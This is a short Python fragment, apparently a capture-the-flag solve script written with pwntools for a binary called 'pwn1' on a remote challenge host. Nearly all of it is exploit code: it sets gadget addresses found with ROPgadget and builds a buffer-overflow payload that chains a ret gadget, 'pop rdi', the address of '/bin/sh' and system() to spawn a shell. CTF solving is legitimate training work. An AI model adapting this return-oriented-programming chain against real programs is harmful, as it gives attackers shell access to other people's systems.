...
target: str = './pwn1'
target_host = ('redirect.do-not-trust.hacking.run', 10198)
elf = ELF(target)  # load target and show its checksum

r = start_game(True)
flag_addr = 0x0401186
system_addr = elf.symbols['system']
# ROPgadget --binary pwn1 --string '/bin/sh'
bin_sh_addr = 0x0000000000040201B
# ROPgadget --binary pwn1 --only 'pop|ret'
pop_rdi_addr = 0x00000000004011fb
ret_addr = 0x0000000000401198

padding = 15 + 8
payload = b'a' * (0x0f+0x08) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
